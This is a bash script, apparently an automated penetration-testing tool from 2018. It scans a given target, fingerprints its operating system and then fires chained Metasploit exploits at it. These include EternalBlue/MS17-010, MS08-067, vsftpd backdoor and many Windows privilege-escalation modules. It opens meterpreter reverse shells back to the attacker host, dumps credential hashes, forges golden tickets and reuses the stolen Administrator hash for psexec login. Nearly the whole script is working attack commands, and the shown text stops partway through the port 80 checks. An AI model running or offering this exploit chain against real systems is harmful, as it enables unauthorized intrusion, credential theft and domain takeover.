#!/bin/bash
#autoscan and report to faraday by darksh3llInfoSec
#30.06.2018
clear #clear the view first
#
BLUE='\033[94m'
RED='\033[91m'
GREEN='\033[92m'
ORANGE='\033[93m'
RESET='\e[0m'
#
TARGET=$1
CUSTOMER=$2
LOG=$3
ReportServer=$4
#
localIP=$(hostname -I)
echo $localIP
CustomerName=$CUSTOMER
workspace=$CUSTOMER
WORK_DIR="/media/sf_KaliSharedFolder/tools/autoscan"
TOOL_DIR="/media/sf_KaliSharedFolder/tools/autoscan/tools"
LOG_DIR=$LOG/$CUSTOMER/$(date | md5sum | awk {'print $1'})
echo $LOG_DIR
mkdir -p $LOG_DIR
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/wordlists/rockyou.txt"
DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
UDP_PORTS="53,67,68,69,88,123,161,162,137,138,139,389,520,2049"
SAMRDUMP="/media/sf_KaliSharedFolder/tools/autoscan/tools/samrdump.py"
WORKSPACE=$CustomerName
USER_FILE="/usr/share/wordlists/metasploit/unix_users.txt"
PASS_FILE="/usr/share/wordlists/rockyou.txt"
LHOST=$(ifconfig  eth0 | grep -w inet | awk {'print $2'})
SRVHOST=$LHOST
#
echo -e "$GREEN"
echo -e "-- Vuln scaner & Exploiter -- by darksh3llInfoSec aka jonny starky -- ${RESET}"
echo ""
echo -e "$GREEN"
echo "You ask me to scan & exploit IP / URL $1"
#
echo "You say Customer is: $2"
echo "You Log path is: $3"
echo "Your Report Server IP / URL is: $4"
#
#service postgresql restart
msfconsole -x "workspace -a "$WORKSPACE"; exit;" > $LOG_DIR/msfworkspace.log #    
service couchdb restart
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "${GREEN} Enumerate the Operating System, TCP und UDP Ports first ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$GREEN RUNNING TCP $RED vuln scan for each open PORT ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "${RED}- Please whait a moment -"
echo -e "${RED}"
nmap -Pn -p- -v -sSV --open --script=vuln $TARGET -oX $LOG_DIR/$TARGET.nmap_tcp.xml -oG $LOG_DIR/$TARGET.portsTCP.gnmap  
msfconsole -x "workspace $WORKSPACE; db_import $LOG_DIR/$TARGET.nmap_tcp.xml; exit"  
cat $LOG_DIRnmaptcp.log
python $TOOL_DIR/listmap/listmap.py -f $LOG_DIR/$TARGET.portsTCP.gnmap -i $TARGET
#
nmap_tcp=$LOG_DIR/$TARGET.nmap_tcp.xml
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$GREEN RUNNING default UDP PORT SCAN ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "${RED} - Please whait a moment - "
echo -e "${RED}"
nmap -Pn -sU -T4 -p $UDP_PORTS --open $TARGET -oX $LOG_DIR/$TARGET.nmap_udp.xml -oG $LOG_DIR/$TARGET.portsUDP.gnmap   
msfconsole -x "workspace $WORKSPACE; db_import $LOG_DIR/$TARGET.nmap_udp.xml; exit"  
#
python $TOOL_DIR/listmap/listmap.py -f $LOG_DIR/$TARGET.portsUDP.gnmap -i $TARGET
#
nmap_udp=$LOG_DIR/$TARGET.nmap_udp.xml
#
echo -e "${RED}- OS enumeration - Please whait a moment - "
echo -e "${RED}"
#
nmap -Pn -A $TARGET -oX $LOG_DIR/$TARGET.OS.xml > $LOG_DIR/$TARGET.OS.txt
cat  $LOG_DIR/$TARGET.OS.txt 
LinuxOS=$(cat $LOG_DIR/$TARGET.OS.txt | grep -w 'OS details' | awk '{print $3,$4,$5,$6,$7}')
WinOS=$(cat $LOG_DIR/$TARGET.OS.txt | grep -w 'OS:' | awk '{print $3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16}' | grep -v Host)
#
if [[ $LinuxOS == *Linux* ]];
then
   linos=$(echo $LinuxOS | awk {'print $1,$2'})
   echo -e "$GREEN ..... search exploits for $linos $RESET"
   searchsploit $linos --exclude="(PoC)|/dos/" 
   echo ""
else
   echo "No Linux System"
echo ""
echo ""
fi
#
if [[ $LinuxOS == *FreeBSD* ]];
then
   linos=$(echo $LinuxOS | awk {'print $1,$2'})
   echo -e "$GREEN ..... search exploits for $linos $RESET"
   linos=FreeBSD
   searchsploit $linos --exclude="(PoC)|/dos/" 
   echo ""
else
   echo "No BSD Unix  System"
echo ""
echo ""
fi

#
if [[ $WinOS == *Windows*10* ]];
then
  echo -e "$ORANGE Exploits are avialable ${RESET}"
  ./exploitWin10.sh
  echo ""
  echo -e "$GREEN Microsoft $BLUE $WinOS $GREEN erkannt, starte $RED standard exploits  ${RESET}"
  msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; use exploit/windows/smb/ms17_010_psexec; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set LPORT 17010; show options; run -z; use exploit/windows/smb/ms17_010_psexec; set LPORT 17010; show options; run -z;  use exploit/windows/dcerpc/ms03_026_dcom; show options; run -z; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set DOMAIN DOMAENE; set PASSWORD PASSWORT; set USER USER; set USER_SID 500; run -z; use post/windows/gather/credentials/sso; set SESSION 1; run -z; use post/windows/gather/smart_hashdump GETSYSTEM=true; set SESSION 1; run -z;use post/windows/manage/wdigest_caching; set SESSION 1; run -z; use post/windows/escalate/golden_ticket; set SESSION 1; run -z; use exploit/windows/local/ms16_016_webdav; setg SESSION 1; setg "$LHOST"; setg "$SRVHOST"; show options; rerun -z ; use exploit/windows/local/ms15_078_atmfd_bof; show options;rerun -z ; use exploit/windows/local/ms15_051_client_copy_image; show options; rerun -z; use exploit/windows/browser/ms14_064_ole_code_execution; set LPORT 14064; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_python; set LPORT 14164; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_run_as_admin; set LPORT 14264; show options; rerun -z; use exploit/windows/fileformat/ms14_060_sandworm; show options; rerun -z;use exploit/windows/fileformat/ms14_064_packager_python; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_run_as_admin; show options; rerun -z; use exploit/windows/local/ms14_058_track_popup_menu; show options; rerun -z ; use exploit/windows/browser/ms14_012_cmarkup_uaf; set LPORT 14012; show options; rerun -z; use exploit/windows/browser/ms14_012_textrange; set LPORT 14112; show options; rerun -z; use exploit/windows/local/ms14_009_ie_dfsvc; show options; rerun -z; use exploit/windows/local/ms13_097_ie_registry_symlink; show options; rerun -z; use exploit/windows/browser/ms13_090_cardspacesigninhelper; set LPORT 13090; show options; rerun -z; use exploit/windows/browser/ie_setmousecapture_uaf; set LPORT 650009; show options; rerun -z; use exploit/windows/browser/ms13_080_cdisplaypointer; set LPORT 13080; show options; rerun -z; use exploit/windows/browser/ms13_069_caret; set LPORT 13069; set show options; rerun -z; use exploit/windows/browser/ms13_059_cflatmarkuppointer; set LPORT 13059; show options; rerun -z ; use exploit/windows/browser/ms13_055_canchor; set LPORT 13055; show options; rerun -z; use exploit/windows/local/ms13_053_schlamperei; set LPORT 13053; show options; rerun -z; use exploit/windows/local/ppr_flatten_rec; show options; rerun -z; use exploit/windows/browser/ms13_009_ie_slayoutrun_uaf; set LPORT 13009; show options; rerun -z; use exploit/windows/local/ms13_005_hwnd_broadcast; show options; rerun -z; exit -y;" # 
else
echo "No Windows 10"
echo ""
echo ""
fi

if [[ $WinOS == *Windows*7* ]];
then
  echo -e "$ORANGE Exploits are avialable ${RESET}"
  ./exploitWin7.sh
  echo ""
  echo -e "$GREEN Microsoft $BLUE $WinOS $GREEN erkannt"
  echo -e "$RED Try to exploit $TARGET with metasploit eternalblue_doublepulsar exploit ${RESET}"
  xterm -hold -bg black -fg white -geometry 85x85 -T "Exploited with metasploit eternalblue windows/smb/ms17_010_eternalblue exploit" -e "msfconsole -x 'spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use windows/smb/ms17_010_eternalblue; setg RHOST $TARGET; setg RHOSTS $TARGET; set ProcessName spoolsv.exe; show options; run;'" &
  echo "press any key to continue"
read -n 1 -s
  ###echo -e "$RED starte standard exploits  ${RESET}"
  ###xterm -hold -bg black -fg white -geometry 125x35 -T "running metasploit win 7 standard exploits" -e "msfconsole -x 'spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use exploit/windows/browser/ms13_009_ie_slayoutrun_uaf; set SRVHOST $localIP; set OBFUSCATE true; run -z; use windows/smb/eternalblue_doublepulsar; setg RHOST $TARGET; setg RHOSTS $TARGET; set LPORT 1234; show options; run -z; use exploit/windows/smb/ms17_010_psexec; set LPORT 17010; show options; run -z; use exploit/windows/smb/ms17_010_psexec;set LPORT 17010; show options;run -z;  use exploit/windows/dcerpc/ms03_026_dcom; show options; run -z; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set DOMAIN $DOMAIN; set PASSWORD $HASCH; set USER $USER; set USER_SID 500; run -z;use post/windows/gather/credentials/sso; set SESSION 1; run -z;use post/windows/gather/smart_hashdump GETSYSTEM=true; set SESSION 1; run -z;use post/windows/manage/wdigest_caching; set SESSION 1; run -z; use post/windows/escalate/golden_ticket; set SESSION 1; run -z;use exploit/windows/local/ms16_016_webdav; setg SESSION 1; setg $LHOST; setg $SRVHOST;show options; rerun -z ; use exploit/windows/local/ms15_078_atmfd_bof; show options; rerun -z ;use exploit/windows/local/ms15_051_client_copy_image; show options; rerun -z;use exploit/windows/browser/ms14_064_ole_code_execution; set LPORT 14064; show options; rerun -z;use exploit/windows/fileformat/ms14_064_packager_python; set LPORT 14164; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_run_as_admin; set LPORT 14264; show options; rerun -z; use exploit/windows/fileformat/ms14_060_sandworm; show options; rerun -z;use exploit/windows/fileformat/ms14_064_packager_python; show options; rerun -z;use exploit/windows/fileformat/ms14_064_packager_run_as_admin; show options; rerun -z;use exploit/windows/local/ms14_058_track_popup_menu; show options; rerun -z ; use exploit/windows/browser/ms14_012_cmarkup_uaf; set LPORT 14012; show options; rerun -z; use exploit/windows/browser/ms14_012_textrange;set LPORT 14112; show options; rerun -z; use exploit/windows/local/ms14_009_ie_dfsvc;show options; rerun -z; use exploit/windows/local/ms13_097_ie_registry_symlink; show options; rerun -z;use exploit/windows/browser/ms13_090_cardspacesigninhelper; set LPORT 13090; show options; rerun -z;use exploit/windows/browser/ie_setmousecapture_uaf; set LPORT 650009; show options; rerun -z; use exploit/windows/browser/ms13_080_cdisplaypointer; set LPORT 13080; show options; rerun -z; use exploit/windows/browser/ms13_069_caret;set LPORT 13069; set show options; rerun -z; use exploit/windows/browser/ms13_059_cflatmarkuppointer; set LPORT 13059; show options; rerun -z ; use exploit/windows/browser/ms13_055_canchor; set LPORT 13055; show options; rerun -z;use exploit/windows/local/ms13_053_schlamperei;set LPORT 13053; show options; rerun -z; use exploit/windows/local/ppr_flatten_rec; show options; rerun -z; use exploit/windows/browser/ms13_009_ie_slayoutrun_uaf; set LPORT 13009;show options; rerun -z; use exploit/windows/local/ms13_005_hwnd_broadcast; show options; rerun -z;'" >> $LOG_DIRmsfworkspace.log &# 
  ###echo "press any key to continue"
#####read -n 1 -s
else
echo -e "No Windows 7"
echo ""
echo ""
fi

if [[ $WinOS == Windows*XP* ]];
then
echo -e "$ORANGE Exploits are avialable ${RESET}"
./exploitWinXP.sh
echo ""
  echo -e "$GREEN $WinOS erkannt, starte standard exploits fuer $WinOS ${RESET}"
  msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; use exploit/windows/smb/ms17_010_psexec; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; show options; run -z; use exploit/windows/smb/ms08_067_netapi; show options; run -z; use exploit/windows/smb/ms08_067_netapi; show options; run -z;use post/windows/gather/smart_hashdump; set session 1; show options; run -z; use post/windows/gather/smart_hashdump;  show options;run; use exploit/windows/smb/ms04_031_netdde; show options; run -z; use exploit/windows/smb/ms04_011_lsass; show options; run -z; use exploit/windows/ssl/ms04_011_pct; show options; run -z; use exploit/windows/smb/ms04_007_killbill; show options; run -z; use exploit/windows/isapi/ms03_051_fp30reg_chunked; show options; run -z; use exploit/windows/smb/ms03_049_netapi; show options; run -z; use exploit/windows/dcerpc/ms03_026_dcom; show options; run -z; use exploit/windows/iis/ms03_007_ntdll_webdav; show options; run -z; use auxiliary/dos/pptp/ms02_063_pptp_dos; show options; run -z; exit -y;" # 
else
echo "No Windows XP"
echo ""
echo ""
fi
#
#
#
if [[ $WinOS == *Windows*Server* ]];
then
echo -e "$ORANGE Exploits are avialable ${RESET}"
./exploitWinSrv2012.sh
  echo ""
  echo -e "$BLUE  $WinOS --- $RED start exploits ${RESET}"
  echo ""
  echo -e "$ORANGE Try to exploit $TARGET with metasploit ms17-010 ${RESET}"
msfconsole -x "spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use exploit/windows/smb/ms17_010_psexec; setg RHOST $TARGET; setg RHOSTS $TARGET; setg LHOST $localIP; set LPORT 17010; set PAYLOAD windows/x64/meterpreter/reverse_tcp; show options; run -z; use post/windows/gather/credentials/sso; set SESSION 1; show options; run -z; use post/windows/gather/smart_hashdump; set SESSION 1; show options; run -z; use post/windows/escalate/golden_ticket; set SESSION 1; show options; run -z; use post/windows/gather/enum_domain; set SESSION 1; run -z;" 
  echo "press any key to continue"
  read -n 1 -s
##
msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; creds -u Administrator -o "$LOG_DIRcreds.log"; exit -y;" 
USER=$(cat $LOG_DIRcreds.log | grep -w "$TARGET" | awk 'BEGIN{FS="[|,:]"} ; {print $4}' | sed 's/"//' | sed 's/.$//' | grep -w "Administrator")
HASH=$(cat $LOG_DIRcreds.log | grep -w "$TARGET" | grep -w "Administrator" | awk 'BEGIN{FS="[|,]"} ; {print $5,$6}' | sed 's/"//g')
#
echo -e "$ORANGE AdminUSER & AdminHASH enumerated -- try to login" 
  echo "press any key to continue"
  read -n 1 -s
msfconsole -x "use exploit/windows/smb/psexec; set payload windows/meterpreter/reverse_tcp; set LHOST $localIP; set LPORT 6666; set RHOST $TARGET ; set SMBUser $USER; set SMBPass $HASH; run -z;" 
##
msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; services -s smb -S domain -o '$LOG_DIRdomain.txt'; exit -y;" 
#
DOMAIN=$(cat $LOG_DIRdomain.txt | awk 'BEGIN{FS="[|,:]"} ; {print $7}' | sed 's/"//' | sed 's/.$//')
DOMAIN=$DOMAIN.LOCAL
#
echo $DOMAIN
echo $USER
echo $HASH
echo $TARGET
echo ""
  echo "press any key to continue"
  read -n 1 -s
echo -e "$ORANGE Exploited with metasploit ms14_068_kerberos_checksum exploit"
msfconsole -x "spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set RHOST $TARGET; set DOMAIN $DOMAIN; set PASSWORD $HASH; set USER $USER; set USER_SID 500; run -z;"
echo "press any key to continue"
read -n 1 -s
msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; use exploit/windows/dcerpc/ms03_026_dcom; show options; run -z; use exploit/windows/local/ms16_016_webdav; setg SESSION 1; setg "$LHOST"; setg "$SRVHOST"; show options; rerun -z ; use exploit/windows/local/ms15_078_atmfd_bof; show options; rerun -z ; use exploit/windows/local/ms15_051_client_copy_image; show options; rerun -z; use exploit/windows/browser/ms14_064_ole_code_execution; set LPORT 14064; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_python; set LPORT 14164; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_run_as_admin; set LPORT 14264; show options; rerun -z; use exploit/windows/fileformat/ms14_060_sandworm; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_python; show options; rerun -z; use exploit/windows/fileformat/ms14_064_packager_run_as_admin; show options; rerun -z; use exploit/windows/local/ms14_058_track_popup_menu; show options; rerun -z ; use exploit/windows/browser/ms14_012_cmarkup_uaf; set LPORT 14012; show options; rerun -z; use exploit/windows/browser/ms14_012_textrange; set LPORT 14112; show options; rerun -z; use exploit/windows/local/ms14_009_ie_dfsvc; show options; rerun -z; use exploit/windows/local/ms13_097_ie_registry_symlink; show options; rerun -z; use exploit/windows/browser/ms13_090_cardspacesigninhelper; set LPORT 13090; show options; rerun -z; use exploit/windows/browser/ie_setmousecapture_uaf; set LPORT 650009; show options; rerun -z; use exploit/windows/browser/ms13_080_cdisplaypointer; set LPORT 13080; show options; rerun -z; use exploit/windows/browser/ms13_069_caret; set LPORT 13069; set show options; rerun -z; use exploit/windows/browser/ms13_059_cflatmarkuppointer; set LPORT 13059; show options; rerun -z ; use exploit/windows/browser/ms13_055_canchor; set LPORT 13055; show options; rerun -z; use exploit/windows/local/ms13_053_schlamperei; set LPORT 13053; show options; rerun -z; use exploit/windows/local/ppr_flatten_rec; show options; rerun -z; use exploit/windows/browser/ms13_009_ie_slayoutrun_uaf; set LPORT 13009; show options; rerun -z; use exploit/windows/local/ms13_005_hwnd_broadcast; show options; rerun -z; exit -y;"
else
echo ""
echo ""
echo "No Windows Server"
fi
#
#echo -e "${GREEN}====================================================================================${RESET}"
#echo -e "$RED RUNNING BRUTE FORCE ${RESET}"
#echo -e "${GREEN}====================================================================================${RESET}"
#$TOOL_DIR/BruteX/brutex $TARGET > $LOG_DIR$TARGET.brutex.log 
#cat $LOG_DIR$TARGET.brutex.log | grep -w 'opened...'
#cat $LOG_DIR$TARGET.brutex.log | grep -w 'attacking'
#cat $LOG_DIR$TARGET.brutex.log | grep -w 'valid passwords found'
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED RUNNING NSLOOKUP ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
nslookup $TARGET > $LOG_DIR/$TARGET.dns.txt #  
cat $LOG_DIR/$TARGET.dns.txt
host $TARGET > $LOG_DIR/$TARGET.host.txt  
cat $LOG_DIR/$TARGET.host.txt
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING WHOIS INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
whois $TARGET > $LOG_DIR/$TARGET.whois.txt #  
cat $LOG_DIR/$TARGET.whois.txt | grep -v whois
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING OSINT INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
theharvester -d $TARGET -l 500 -b all -v -n -c -t -h -f $LOG_DIR/$TARGET.theharvester.html > $LOG_DIR/$TARGET.osint.txt #  
cat $LOG_DIR/$TARGET.osint.txt
python $TOOL_DIR/metagoofil/metagoofil.py -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOG_DIR -f $LOG_DIR/$TARGET.metagoofil.txt
cat $LOG_DIR/$TARGET.metagoofil.txt | grep -v Metagoofil | grep -h html
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING DNS INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$ORANGE"
dig -x $TARGET > $LOG_DIR/$TARGET.dig.txt #  
cat $LOG_DIR/$TARGET.dig.txt | grep -v DiG
dnsenum $TARGET > $LOG_DIR/$TARGET.dnsenum..txt #  
cat $LOG_DIR/$TARGET.dnsenum..txt | grep -v Smartmatch | grep -v dnsenum 
#
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED Looking arround  ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
port_67=`cat $nmap_udp | grep 'portid="67"' | grep filtered`
port_68=`cat $nmap_udp | grep 'portid="68"' | grep filtered`
port_69=`cat $nmap_udp | grep 'portid="69"'  | grep filtered`
port_123=`cat $nmap_udp | grep 'portid="123"' | grep filtered`
port_161=`cat $nmap_udp | grep 'portid="161"'  | grep filtered`
port_21=`cat $nmap_tcp | grep 'portid="21"' | grep open`
port_22=`cat $nmap_tcp | grep 'portid="22"' | grep open`
port_23=`cat $nmap_tcp | grep 'portid="23"' | grep open`
port_25=`cat $nmap_tcp | grep 'portid="25"' | grep open`
port_53=`cat $nmap_udp | grep 'portid="53"' | grep filtered`
port_79=`cat $nmap_udp | grep 'portid="79"' | grep filtered`
port_80=`cat $nmap_tcp | grep 'portid="80"' | grep open`
port_88=`cat $nmap_tcp | grep 'portid="88"' | grep open`
port_110=`cat $nmap_tcp | grep 'portid="110"' | grep open`
port_111=`cat $nmap_tcp | grep 'portid="111"' | grep open`
port_135=`cat $nmap_tcp | grep 'portid="135"' | grep open`
port_139=`cat $nmap_tcp | grep 'portid="139"' | grep open`
port_162=`cat $nmap_tcp | grep 'portid="162"' | grep open`
port_389=`cat $nmap_tcp | grep 'portid="389"' | grep open`
port_443=`cat $nmap_tcp | grep 'portid="443"' | grep open`
port_445=`cat $nmap_tcp | grep 'portid="445"' | grep open`
port_512=`cat $nmap_tcp | grep 'portid="512"' | grep open`
port_513=`cat $nmap_tcp | grep 'portid="513"' | grep open`
port_514=`cat $nmap_tcp | grep 'portid="514"' | grep open`
port_623=`cat $nmap_tcp | grep 'portid="623"' | grep open`
port_624=`cat $nmap_tcp | grep 'portid="624"' | grep open`
port_1099=`cat $nmap_tcp | grep 'portid="1099"' | grep open`
port_1433=`cat $nmap_tcp | grep 'portid="1433"' | grep open`
port_1524=`cat $nmap_tcp | grep 'portid="1524"' | grep open`
port_2049=`cat $nmap_tcp | grep 'portid="2049"' | grep open`
port_2121=`cat $nmap_tcp | grep 'portid="2121"' | grep open`
port_3128=`cat $nmap_tcp | grep 'portid="3128"' | grep open`
port_3306=`cat $nmap_tcp | grep 'portid="3306"' | grep open`
port_3310=`cat $nmap_tcp | grep 'portid="3310"' | grep open`
port_3389=`cat $nmap_tcp | grep 'portid="3389"' | grep open`
port_3632=`cat $nmap_tcp | grep 'portid="3632"' | grep open`
port_4443=`cat $nmap_tcp | grep 'portid="4443"' | grep open`
port_8443=`cat $nmap_tcp | grep 'portid="4443"' | grep open`
port_5432=`cat $nmap_tcp | grep 'portid="5432"' | grep open`
port_5800=`cat $nmap_tcp | grep 'portid="5800"' | grep open`
port_5900=`cat $nmap_tcp | grep 'portid="5900"' | grep open`
port_5984=`cat $nmap_tcp | grep 'portid="5984"' | grep open`
port_6667=`cat $nmap_tcp | grep 'portid="6667"' | grep open`
port_8000=`cat $nmap_tcp | grep 'portid="8000"' | grep open`
port_8009=`cat $nmap_tcp | grep 'portid="8009"' | grep open`
port_8080=`cat $nmap_tcp | grep 'portid="8080"' | grep open`
port_8180=`cat $nmap_tcp | grep 'portid="8180"' | grep open`
port_8443=`cat $nmap_tcp | grep 'portid="8443"' | grep open`
port_8888=`cat $nmap_tcp | grep 'portid="8888"' | grep open`
port_10000=`cat $nmap_tcp | grep 'portid="10000"' | grep open`
port_16992=`cat $nmap_tcp | grep 'portid="16992"' | grep open`
port_27017=`cat $nmap_tcp | grep 'portid="27017"' | grep open`
port_27018=`cat $nmap_tcp | grep 'portid="27018"' | grep open`
port_27019=`cat $nmap_tcp | grep 'portid="27019"' | grep open`
port_28017=`cat $nmap_tcp | grep 'portid="28017"' | grep open`
#
ms08067=`cat $nmap_tcp | grep "smb-vuln-ms08-067" | grep "VULNERABLE"`
#
echo -e "${GREEN}============================================================================${RESET}"
echo -e "${GREEN}=============================================================================${RESET}"
#
if [ -z "$ms08067" ];
then
  echo -e "$RED + -- --=[smb-vuln-ms08-067 dont exist... skipping exploit ${RESET}"
else
  echo -e "$ORANGE + -- --=[smb-vuln-ms08-067 vuln exist... running tests...${RESET}"
  msfconsole -x "spool "$LOG_DIR/$TARGET.ms08067.log"; workspace "$WORKSPACE"; use exploit/windows/smb/ms08_067_netapi; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; show options; run -z; exit -y;" 
fi

if [ -z "$port_21" ];
then
  echo -e "$RED + -- --=[Port 21 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 21 opened... running tests...${RESET}"
  nmap -A -sV -Pn -sC -p 21 --script=ftp-* $TARGET -oX $LOG_DIR/$TARGET.nmap_ftp.xml >> $LOG_DIRnmaptcp.log 
  msfconsole -x "workspace $WORKSPACE; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;" 
fi

if [ -z "$port_22" ];
then
  echo -e "$RED + -- --=[Port 22 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 22 opened... running tests...${RESET}"
  python $TOOL_DIR/ssh-audit/ssh-audit.py $TARGET:22
  nmap -A -sV -Pn -sC  -p 22 --script=ssh-* $TARGET -oX $LOG_DIR/$TARGET.nmap_ssh22.xml   
  msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET";setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;" 
fi

if [ -z "$port_65022" ];
then
  echo -e "$RED + -- --=[Port 22 closed... skipping. ${RESET}"
else
    python $TOOL_DIR/ssh-audit/ssh-audit.py $TARGET:65022
    nmap -A -sV -Pn -sC  -p 65022 --script=ssh-* $TARGET -oX $LOG_DIR/$TARGET.nmap_ssh65022.xml
  msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RPORT 65022; setg RPORTS 65022; setg RHOSTS "$TARGET";setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;" 
fi
#
## ADD another SSH PORT
#
if [ -z "$port_23" ];
then
  echo -e "$RED + -- --=[Port 23 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 23 opened... running tests... ${RESET}"
  echo ""
  cisco-torch -A $TARGET > $LOG_DIR/$TARGET.cisco-torch.txt
  nmap -A -sV -Pn  --script=telnet* -p 23 $TARGET -oX $LOG_DIR/$TARGET.telnet.xml   
  msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version;run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"  
fi

if [ -z "$port_25" ];
then
  echo -e "$RED + -- --=[Port 25 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 25 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=smtp* -p 25 $TARGET -oX $LOG_DIR/$TARGET.smtp.xml
  smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET > $LOG_DIR/$TARGET.smtp-user-enum.txt
  msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"  
fi

if [ -z "$port_53" ];
then
  echo -e "$RED + -- --=[Port 53 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 53 opened... running tests... ${RESET}"
  nmap -A -sV -Pn  --script=dns* -p 53 $TARGET -oX $LOG_DIR/$TARGET.dns.xml 
fi

if [ -z "$port_67" ];
then
  echo -e "$RED + -- --=[Port 67 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 67 opened... running tests... ${RESET}"
  nmap -A -sU -sV -Pn  --script=dhcp* -p 67 $TARGET -oX $LOG_DIR/$TARGET.dhcp.xml   
fi

if [ -z "$port_68" ];
then
  echo -e "$RED + -- --=[Port 68 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 68 opened... running tests... ${RESET}"
  nmap -A -sU -sV -Pn  --script=dhcp* -p 68 $TARGET -oX $LOG_DIR/$TARGET.dhcp2.xml   
fi

if [ -z "$port_69" ];
then
  echo -e "$RED + -- --=[Port 69 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 69 opened... running tests... ${RESET}"
  nmap -A -sU -sV -Pn  --script=tftp* -p 69 $TARGET -oX $LOG_DIR/$TARGET.tftp.xml   
fi

if [ -z "$port_79" ];
then
  echo -e "$RED + -- --=[Port 79 closed... skipping. ${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 79 opened... running tests... ${RESET}"
  nmap -A -sV -Pn  --script=finger* -p 79 $TARGET   
  bin/fingertool.sh $TARGET $USER_FILE > $LOG_DIRfinger.log # 
fi

if [ -z "$port_80" ];
  then
    echo -e "$RED + -- --=[Port 80 closed... skipping. ${RESET}"
  else
echo -e "$RED PORT 80 open, running Test"
   echo -e "${GREEN}====================================================================================${RESET}"
   echo -e "$RED GATHERING DNS SUBDOMAINS ${RESET}"
   echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOG_DIR/$TARGET.sublistertxt  
    dos2unix $LOG_DIR/domains/domains-$TARGET.txt 2>/dev/null > $LOG_DIR/$TARGET.dos2unix.txt  
   echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$ORANGE + -- --=[Port 80 opened... running tests...${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING FOR WAF ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    wafw00f http://$TARGET > $LOG_DIR/$TARGET.wafw00f80.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED GATHERING HTTP INFO ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    whatweb http://$TARGET > $LOG_DIR/$TARGET.whatweb.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
